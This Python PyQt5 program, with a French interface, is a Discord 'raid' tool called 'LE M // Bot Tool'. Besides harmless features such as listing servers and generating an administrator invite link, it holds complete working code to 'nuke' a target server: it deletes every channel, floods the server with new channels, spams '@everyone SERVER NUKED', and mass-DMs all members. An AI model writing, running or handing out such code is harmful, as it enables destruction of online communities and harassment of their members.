import sys
import os
import requests
import threading
import time
import concurrent.futures
import urllib3
import webbrowser

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextBrowser, QFrame, QGraphicsDropShadowEffect, 
                             QScrollArea, QInputDialog, QMessageBox, QStyle, QStackedWidget)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPoint, QPropertyAnimation, QEasingCurve
from PyQt5.QtGui import QColor, QCursor

TOKEN_FILE = 'input/bot_token.txt'

# --- Logic Functions ---

def load_token():
    if not os.path.exists('input'):
        os.makedirs('input')
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            content = f.read().strip()
            return content if content and not content.startswith('#') else ""
    else:
        with open(TOKEN_FILE, 'w') as f:
            f.write("# Mettez votre Token de Bot ici (une seule ligne)")
        return ""

def get_headers(token):
    return {
        'Authorization': f'Bot {token}', 
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
    }

def logic_bot_info(logger, token):
    if not token:
        logger.emit("<font color='#ef4444'>[-] Token manquant.</font>")
        return

    logger.emit(f"<font color='#3b82f6'><b>[*] Récupération des infos du Bot...</b></font>")
    try:
        res = requests.get('https://discord.com/api/v9/users/@me', headers=get_headers(token))
        if res.status_code == 200:
            data = res.json()
            logger.emit(f"<font color='#22c55e'>[+] Connecté en tant que: {data['username']}#{data['discriminator']}</font>")
            logger.emit(f"<font color='#e4e4e7'>    ID: {data['id']}</font>")
            logger.emit(f"<font color='#e4e4e7'>    Bio: {data.get('bio', 'Aucune')}</font>")
            logger.emit(f"<font color='#e4e4e7'>    MFA: {data.get('mfa_enabled', False)}</font>")
        else:
            logger.emit(f"<font color='#ef4444'>[-] Token Invalide (Code {res.status_code})</font>")
    except Exception as e:
        logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_list_guilds(logger, token):
    if not token: return
    logger.emit(f"<font color='#3b82f6'><b>[*] Liste des serveurs...</b></font>")
    try:
        res = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=get_headers(token))
        if res.status_code == 200:
            guilds = res.json()
            logger.emit(f"<font color='#22c55e'>[+] {len(guilds)} serveurs trouvés :</font>")
            for g in guilds:
                logger.emit(f"<font color='#e4e4e7'>    - {g['name']} (ID: {g['id']})</font>")
        else:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {res.status_code}</font>")
    except Exception as e:
        logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_invite_gen(logger, token, manual_id=None):
    bot_id = manual_id
    if not bot_id and token:
        try:
            res = requests.get('https://discord.com/api/v9/users/@me', headers=get_headers(token))
            if res.status_code == 200:
                bot_id = res.json()['id']
        except: pass
    
    if bot_id:
        url = f"https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot&permissions=8"
        logger.emit(f"<font color='#22c55e'>[+] Lien d'invitation (Admin) :</font>")
        logger.emit(f"<font color='#3b82f6'><a href='{url}'>{url}</a></font>")
        
        # Vérification du lien (comme demandé)
        try:
            r = requests.get(url)
            logger.emit(f"<font color='#a1a1aa'>[i] Status URL: {r.status_code}</font>")
        except: pass
    else:
        logger.emit(f"<font color='#ef4444'>[-] Impossible de générer le lien (ID manquant).</font>")

def logic_delete_channels(logger, token, guild_id, stop_check=None):
    if not token or not guild_id:
        logger.emit("<font color='#ef4444'>[-] Token ou ID Serveur manquant.</font>")
        return

    logger.emit(f"<font color='#3b82f6'><b>[*] Suppression des salons sur {guild_id}...</b></font>")
    headers = get_headers(token)
    
    try:
        res = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
        if res.status_code != 200:
            logger.emit(f"<font color='#ef4444'>[-] Impossible de récupérer les salons ({res.status_code})</font>")
            return
            
        channels = res.json()
        
        def delete_one(c_id):
            if stop_check and stop_check(): return c_id, 0
            r = requests.delete(f'https://discord.com/api/v9/channels/{c_id}', headers=headers)
            return c_id, r.status_code

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(delete_one, c['id']): c for c in channels}
            for future in concurrent.futures.as_completed(futures):
                if stop_check and stop_check(): break
                cid, status = future.result()
                if status in [200, 204]:
                    logger.emit(f"<font color='#22c55e'>[+] Salon {cid} supprimé</font>")
                elif status != 0:
                    logger.emit(f"<font color='#ef4444'>[-] Erreur suppression {cid} ({status})</font>")
    except Exception as e:
        logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_spam_channels(logger, token, guild_id, name, amount, stop_check=None):
    if not token or not guild_id: return
    logger.emit(f"<font color='#3b82f6'><b>[*] Création de {amount} salons '{name}'...</b></font>")
    headers = get_headers(token)
    
    def create_one(i):
        if stop_check and stop_check(): return 0
        r = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': name, 'type': 0})
        return r.status_code

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(create_one, i) for i in range(int(amount))]
        success = 0
        for future in concurrent.futures.as_completed(futures):
            if stop_check and stop_check(): break
            if future.result() in [200, 201]: success += 1
    
    logger.emit(f"<font color='#22c55e'>[+] {success} salons créés.</font>")

def logic_spam_messages(logger, token, guild_id, message, amount_per_channel, stop_check=None):
    if not token or not guild_id: return
    logger.emit(f"<font color='#3b82f6'><b>[*] Spam de messages sur {guild_id}...</b></font>")
    headers = get_headers(token)
    
    # Get channels first
    res = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    if res.status_code != 200: return
    channels = [c['id'] for c in res.json() if c['type'] == 0] # Text channels only
    
    def spam_one(c_id):
        for _ in range(int(amount_per_channel)):
            if stop_check and stop_check(): break
            requests.post(f'https://discord.com/api/v9/channels/{c_id}/messages', headers=headers, json={'content': message})

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for c_id in channels:
            if stop_check and stop_check(): break
            executor.submit(spam_one, c_id)
    
    logger.emit(f"<font color='#22c55e'>[+] Spam envoyé dans {len(channels)} salons.</font>")

def logic_nuke(logger, token, guild_id, chan_name, msg_content, chan_amount, stop_check=None):
    if not token or not guild_id: return
    logger.emit(f"<font color='#ef4444'><b>[!!!] Lancement du NUKE sur {guild_id} [!!!]</b></font>")
    
    # 1. Delete Channels
    logic_delete_channels(logger, token, guild_id, stop_check)
    if stop_check and stop_check(): return
    time.sleep(1)
    
    # 2. Create Channels
    logic_spam_channels(logger, token, guild_id, chan_name, chan_amount, stop_check)
    if stop_check and stop_check(): return
    time.sleep(1)
    
    # 3. Spam Messages
    logic_spam_messages(logger, token, guild_id, msg_content, 5, stop_check)
    
    logger.emit(f"<font color='#ef4444'><b>[!!!] NUKE TERMINÉ [!!!]</b></font>")

def logic_mass_dm(logger, token, guild_id, message, stop_check=None):
    if not token or not guild_id: return
    logger.emit(f"<font color='#3b82f6'><b>[*] Mass DM sur {guild_id} (Peut être lent)...</b></font>")
    headers = get_headers(token)
    
    # Note: Bots cannot fetch full member list easily without intents and pagination.
    # We try to fetch limit=1000
    res = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers)
    if res.status_code != 200:
        logger.emit(f"<font color='#ef4444'>[-] Impossible de récupérer les membres ({res.status_code}). Vérifiez les Intents.</font>")
        return
        
    members = res.json()
    logger.emit(f"<font color='#a1a1aa'>[i] {len(members)} membres trouvés.</font>")
    
    count = 0
    for m in members:
        if stop_check and stop_check(): break
        user = m['user']
        if user.get('bot'): continue
        
        try:
            # Create DM
            dm_res = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={'recipient_id': user['id']})
            if dm_res.status_code == 200:
                chan_id = dm_res.json()['id']
                # Send Msg
                msg_res = requests.post(f'https://discord.com/api/v9/channels/{chan_id}/messages', headers=headers, json={'content': message})
                if msg_res.status_code == 200:
                    logger.emit(f"<font color='#22c55e'>[+] DM envoyé à {user['username']}</font>")
                    count += 1
            time.sleep(0.5) # Rate limit protection
        except: pass
        
    logger.emit(f"<font color='#3b82f6'><b>[*] Mass DM terminé ({count} envoyés).</b></font>")

def logic_leave_guild(logger, token, guild_id):
    if not token or not guild_id: return
    logger.emit(f"<font color='#3b82f6'><b>[*] Quitter le serveur {guild_id}...</b></font>")
    headers = get_headers(token)
    try:
        res = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers=headers)
        if res.status_code == 204:
            logger.emit(f"<font color='#22c55e'>[+] Serveur quitté avec succès.</font>")
        else:
            logger.emit(f"<font color='#ef4444'>[-] Échec ({res.status_code})</font>")
    except Exception as e:
        logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

# --- Worker Thread ---

class Worker(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, target, *args):
        super().__init__()
        self.target = target
        self.args = args

    def run(self):
        self.target(self.log_signal, *self.args)
        self.finished_signal.emit()

# --- Main Window ---

class BotToolWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.resize(1000, 650)
        self.worker = None
        self.oldPos = self.pos()
        self.stop_flag = False
        
        # Main Container
        self.container = QFrame()
        self.container.setObjectName("MainContainer")
        self.setCentralWidget(self.container)
        
        # Shadow
        shadow = QGraphicsDropShadowEffect(self)
        shadow.setBlurRadius(20)
        shadow.setXOffset(0)
        shadow.setYOffset(0)
        shadow.setColor(QColor(0, 0, 0, 180))
        self.container.setGraphicsEffect(shadow)
        
        # Layout
        self.main_layout = QVBoxLayout(self.container)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)

        # --- Title Bar ---
        self.title_bar = QFrame()
        self.title_bar.setObjectName("TitleBar")
        self.title_bar.setFixedHeight(40)
        
        title_layout = QHBoxLayout(self.title_bar)
        title_layout.setContentsMargins(15, 0, 10, 0)
        
        title_label = QLabel("LE M // Bot Tool")
        title_label.setObjectName("TitleLabel")
        
        btn_min = QPushButton("─")
        btn_min.setObjectName("TitleBtn")
        btn_min.setFixedSize(30, 30)
        btn_min.clicked.connect(self.showMinimized)
        
        btn_close = QPushButton("✕")
        btn_close.setObjectName("TitleBtnClose")
        btn_close.setFixedSize(30, 30)
        btn_close.clicked.connect(self.close)
        
        title_layout.addWidget(title_label)
        title_layout.addStretch()
        title_layout.addWidget(btn_min)
        title_layout.addWidget(btn_close)
        
        self.main_layout.addWidget(self.title_bar)
        
        # --- Content ---
        content_layout = QHBoxLayout()
        content_layout.setSpacing(0)
        content_layout.setContentsMargins(0, 0, 0, 0)

        # --- Left Panel ---
        left_panel = QFrame()
        left_panel.setObjectName("SidePanel")
        left_panel.setFixedWidth(320)
        
        left_layout = QVBoxLayout(left_panel)
        left_layout.setSpacing(5)
        left_layout.setContentsMargins(15, 20, 15, 20)

        self.menu_label = QLabel("Bot Tool - LE M")
        self.menu_label.setObjectName("MenuLabel")
        self.menu_label.setAlignment(Qt.AlignCenter)
        left_layout.addWidget(self.menu_label)

        # Inputs
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Bot Token")
        self.token_input.setEchoMode(QLineEdit.Password)
        left_layout.addWidget(self.token_input)

        self.btn_edit = QPushButton()
        self.btn_edit.setObjectName("FolderBtn")
        self.btn_edit.setIcon(self.style().standardIcon(QStyle.SP_DirIcon))
        self.btn_edit.setFixedSize(40, 40)
        self.btn_edit.setToolTip("Ouvrir le fichier bot_token.txt")
        self.btn_edit.clicked.connect(self.open_token_file)
        
        btn_layout = QHBoxLayout()
        lbl_list = QLabel("Fichier Token :")
        lbl_list.setStyleSheet("color: #a1a1aa; font-weight: bold; font-size: 13px; margin-right: 5px;")
        btn_layout.addStretch()
        btn_layout.addWidget(lbl_list)
        btn_layout.addWidget(self.btn_edit)
        btn_layout.addStretch()
        left_layout.addLayout(btn_layout)

        self.guild_input = QLineEdit()
        self.guild_input.setPlaceholderText("ID Serveur (Cible)")
        left_layout.addWidget(self.guild_input)

        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet("background-color: #333; max-height: 1px;")
        left_layout.addWidget(line)

        # Scroll Area for Buttons
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("background: transparent; border: none;")
        
        self.stacked_widget = QStackedWidget()
        
        # --- Page Main ---
        page_main = QWidget()
        layout_main = QVBoxLayout(page_main)
        layout_main.setSpacing(2)
        layout_main.setContentsMargins(0, 0, 0, 0)
        
        self.btn_info = QPushButton("🔍  Infos Bot")
        btn_menu_manage = QPushButton("⚙️  Gestion >")
        btn_menu_raid = QPushButton("💥  Raid / Spam >")
        
        for btn in [self.btn_info, btn_menu_manage, btn_menu_raid]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_main.addWidget(btn)
        layout_main.addStretch()
            
        # --- Page Manage ---
        page_manage = QWidget()
        layout_manage = QVBoxLayout(page_manage)
        layout_manage.setSpacing(2)
        layout_manage.setContentsMargins(0, 0, 0, 0)
        
        self.btn_list = QPushButton("📜  Lister Serveurs")
        self.btn_invite = QPushButton("🔗  Générer Invitation")
        self.btn_invite_id = QPushButton("🔗  Invite via ID")
        self.btn_leave = QPushButton("🏃  Quitter Serveur")
        btn_back_manage = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_list, self.btn_invite, self.btn_invite_id, self.btn_leave, btn_back_manage]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_manage.addWidget(btn)
        layout_manage.addStretch()
            
        # --- Page Raid ---
        page_raid = QWidget()
        layout_raid = QVBoxLayout(page_raid)
        layout_raid.setSpacing(2)
        layout_raid.setContentsMargins(0, 0, 0, 0)
        
        self.btn_nuke = QPushButton("💥  Nuke Serveur")
        self.btn_del = QPushButton("🗑️  Supprimer Salons")
        self.btn_spam = QPushButton("📢  Spammer Salons")
        self.btn_dm = QPushButton("📨  Mass DM")
        btn_back_raid = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_nuke, self.btn_del, self.btn_spam, self.btn_dm, btn_back_raid]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_raid.addWidget(btn)
        layout_raid.addStretch()
            
        self.stacked_widget.addWidget(page_main)
        self.stacked_widget.addWidget(page_manage)
        self.stacked_widget.addWidget(page_raid)
        
        # Connect Actions
        self.btn_info.clicked.connect(lambda: self.start_task(logic_bot_info, self.get_token()))
        self.btn_list.clicked.connect(lambda: self.start_task(logic_list_guilds, self.get_token()))
        self.btn_invite.clicked.connect(self.action_invite)
        self.btn_invite_id.clicked.connect(self.action_invite_id)
        self.btn_nuke.clicked.connect(self.action_nuke)
        self.btn_del.clicked.connect(lambda: self.start_task(logic_delete_channels, self.get_token(), self.guild_input.text()))
        self.btn_spam.clicked.connect(self.action_spam)
        self.btn_dm.clicked.connect(self.action_massdm)
        self.btn_leave.clicked.connect(lambda: self.start_task(logic_leave_guild, self.get_token(), self.guild_input.text()))
        
        # Navigation
        btn_menu_manage.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(1))
        btn_menu_raid.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(2))
        btn_back_manage.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        btn_back_raid.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))

        scroll_area.setWidget(self.stacked_widget)
        left_layout.addWidget(scroll_area)

        self.btn_clear = QPushButton("🧹  Effacer Console")
        self.btn_clear.setObjectName("ClearBtn")
        self.btn_clear.setCursor(Qt.PointingHandCursor)
        self.btn_clear.clicked.connect(self.clear_logs)
        left_layout.addWidget(self.btn_clear)

        self.btn_stop = QPushButton("🛑  STOP")
        self.btn_stop.setObjectName("ExitBtn")
        self.btn_stop.setCursor(Qt.PointingHandCursor)
        self.btn_stop.clicked.connect(self.stop_task)
        left_layout.addWidget(self.btn_stop)

        btn_back = QPushButton("⬅️  Retour")
        btn_back.setObjectName("ExitBtn")
        btn_back.setCursor(Qt.PointingHandCursor)
        btn_back.clicked.connect(self.close)
        left_layout.addWidget(btn_back)

        # --- Right Panel ---
        right_panel = QWidget()
        right_panel.setObjectName("RightPanel")
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(0)

        header_frame = QFrame()
        header_frame.setObjectName("HeaderFrame")
        header_frame.setFixedHeight(50)
        header_layout = QHBoxLayout(header_frame)
        term_label = QLabel("SORTIE TERMINAL")
        term_label.setObjectName("HeaderLabel")
        header_layout.addWidget(term_label)
        header_layout.addStretch()
        right_layout.addWidget(header_frame)

        self.console = QTextBrowser()
        self.console.setReadOnly(True)
        self.console.setOpenExternalLinks(True)
        right_layout.addWidget(self.console)

        self.status_bar = QFrame()
        self.status_bar.setObjectName("StatusBar")
        self.status_bar.setFixedHeight(30)
        status_layout = QHBoxLayout(self.status_bar)
        status_layout.setContentsMargins(10, 0, 10, 0)
        
        self.status_label = QLabel("Système Prêt")
        self.status_label.setObjectName("StatusLabel")
        status_layout.addWidget(self.status_label)
        
        right_layout.addWidget(self.status_bar)

        content_layout.addWidget(left_panel)
        content_layout.addWidget(right_panel)
        self.main_layout.addLayout(content_layout)

        self.apply_styles()

        self.setWindowOpacity(0)
        self.anim = QPropertyAnimation(self, b"windowOpacity")
        self.anim.setDuration(500)
        self.anim.setStartValue(0)
        self.anim.setEndValue(1)
        self.anim.setEasingCurve(QEasingCurve.OutQuad)
        self.anim.start()

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.oldPos = event.globalPos()

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton:
            delta = QPoint(event.globalPos() - self.oldPos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.oldPos = event.globalPos()

    def apply_styles(self):
        self.setStyleSheet("""
            QMainWindow { background-color: transparent; }
            QFrame#MainContainer { background-color: #09090b; border: 1px solid #27272a; border-radius: 12px; }
            QFrame#SidePanel { background-color: #101012; border-right: 1px solid #27272a; border-bottom-left-radius: 12px; }
            QFrame#HeaderFrame { background-color: #101012; border-bottom: 1px solid #27272a; }
            QFrame#TitleBar { background-color: #101012; border-bottom: 1px solid #27272a; border-top-left-radius: 12px; border-top-right-radius: 12px; }
            QLabel#TitleLabel { color: #71717a; font-family: 'Consolas'; font-weight: bold; font-size: 12px; }
            QPushButton#TitleBtn, QPushButton#TitleBtnClose { background-color: transparent; border: none; color: #71717a; font-weight: bold; font-size: 14px; padding: 0; }
            QPushButton#TitleBtn:hover { color: #fff; }
            QPushButton#TitleBtnClose:hover { color: #ef4444; }
            QLabel#HeaderLabel { color: #71717a; font-weight: bold; letter-spacing: 1px; padding-left: 10px; }
            QFrame#StatusBar { background-color: #101012; border-top: 1px solid #27272a; border-bottom-right-radius: 12px; }
            QLabel#StatusLabel { color: #52525b; font-size: 12px; }
            QLineEdit { background-color: #27272a; border: 1px solid #27272a; border-radius: 8px; padding: 12px; color: #f4f4f5; font-family: 'Consolas', monospace; font-size: 14px; }
            QLineEdit:focus { border: 1px solid #6366f1; background-color: #202023; }
            QPushButton { background-color: #18181b; border: 1px solid #27272a; border-radius: 8px; padding: 12px 20px; color: #e4e4e7; font-weight: 600; text-align: left; }
            QPushButton:hover { background-color: #27272a; border-color: #3f3f46; color: #ffffff; }
            QPushButton:pressed { background-color: #3f3f46; }
            QPushButton#ActionBtn { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4f46e5, stop:1 #7c3aed); border: 1px solid #6366f1; color: #ffffff; text-align: center; }
            QPushButton#ActionBtn:hover { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4338ca, stop:1 #6d28d9); border: 1px solid #818cf8; }
            QPushButton#ExitBtn { background-color: #18181b; border: 1px solid #ef4444; color: #ef4444; text-align: center; }
            QPushButton#ExitBtn:hover { background-color: #ef4444; color: #fff; }
            QPushButton#ClearBtn { text-align: center; }
            QPushButton#FolderBtn { text-align: center; padding: 0; }
            QTextBrowser { background-color: #000000; border: none; color: #22c55e; font-family: 'Consolas', 'Courier New', monospace; font-size: 13px; padding: 20px; line-height: 1.5; border-bottom-right-radius: 12px; }
            QLabel#MenuLabel { font-size: 16px; font-weight: 800; color: #6366f1; padding: 10px 0; letter-spacing: 1px; }
            QScrollBar:vertical { border: none; background: #101012; width: 8px; margin: 0px; }
            QScrollBar::handle:vertical { background: #3f3f46; min-height: 20px; border-radius: 4px; }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }
        """)

    def log_message(self, message):
        self.console.append(message)
        sb = self.console.verticalScrollBar()
        sb.setValue(sb.maximum())

    def clear_logs(self):
        self.console.clear()

    def get_token(self):
        t = self.token_input.text().strip()
        return t if t else load_token()

    def open_token_file(self):
        if not os.path.exists('input'):
            os.makedirs('input')
        if not os.path.exists(TOKEN_FILE) or os.path.getsize(TOKEN_FILE) == 0:
            with open(TOKEN_FILE, 'w') as f:
                f.write("# Mettez votre Token de Bot ici (une seule ligne)")
        
        try:
            if os.name == 'nt':
                os.startfile(os.path.abspath(TOKEN_FILE))
            else:
                subprocess.call(['xdg-open', TOKEN_FILE])
        except Exception as e:
            self.log_message(f"<font color='#ef4444'>[-] Erreur ouverture fichier: {e}</font>")

    def check_stop(self):
        return self.stop_flag

    def stop_task(self):
        self.stop_flag = True
        self.log_message("<font color='#ef4444'>[!] Arrêt demandé...</font>")

    def start_task(self, func, *args):
        if self.worker and self.worker.isRunning():
            self.log_message("<font color='#ef4444'>[-] Une tâche est déjà en cours.</font>")
            return

        self.stop_flag = False
        self.status_label.setText("Traitement en cours...")
        self.worker = Worker(func, *args)
        self.worker.log_signal.connect(self.log_message)
        self.worker.finished_signal.connect(self.task_finished)
        self.worker.start()

    def task_finished(self):
        self.status_label.setText("Système Prêt")
        self.log_message("<font color='#3f3f46'>----------------------------------------</font>")

    # --- Actions ---

    def action_invite(self):
        token = self.get_token()
        if not token:
            # Ask for ID manually
            bid, ok = QInputDialog.getText(self, "Générateur", "ID du Bot (Client ID) :")
            if ok and bid:
                self.start_task(logic_invite_gen, None, bid)
        else:
            # Try to use token, if fails, ask
            self.start_task(logic_invite_gen, token)

    def action_invite_id(self):
        bid, ok = QInputDialog.getText(self, "Invite via ID", "ID du Bot (Client ID) :")
        if ok and bid:
            self.start_task(logic_invite_gen, None, bid)

    def action_nuke(self):
        gid = self.guild_input.text().strip()
        if not gid:
            self.log_message("<font color='#ef4444'>[-] ID Serveur requis pour le Nuke.</font>")
            return
        
        confirm = QMessageBox.warning(self, "Attention", "Voulez-vous vraiment NUKER ce serveur ?\nCela supprimera tous les salons.", QMessageBox.Yes | QMessageBox.No)
        if confirm != QMessageBox.Yes: return

        cname, ok1 = QInputDialog.getText(self, "Nuke Config", "Nom des salons à créer :", text="nuked-by-le-m")
        if not ok1: return
        msg, ok2 = QInputDialog.getText(self, "Nuke Config", "Message de spam :", text="@everyone SERVER NUKED")
        if not ok2: return
        amount, ok3 = QInputDialog.getInt(self, "Nuke Config", "Nombre de salons :", 50, 1, 500)
        if not ok3: return

        self.start_task(logic_nuke, self.get_token(), gid, cname, msg, amount, self.check_stop)

    def action_spam(self):
        gid = self.guild_input.text().strip()
        if not gid: return
        
        msg, ok = QInputDialog.getText(self, "Spam", "Message à spammer :")
        if ok and msg:
            self.start_task(logic_spam_messages, self.get_token(), gid, msg, 10, self.check_stop)

    def action_massdm(self):
        gid = self.guild_input.text().strip()
        if not gid: return
        
        msg, ok = QInputDialog.getText(self, "Mass DM", "Message à envoyer aux membres :")
        if ok and msg:
            self.start_task(logic_mass_dm, self.get_token(), gid, msg, self.check_stop)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = BotToolWindow()
    window.show()
    sys.exit(app.exec_())
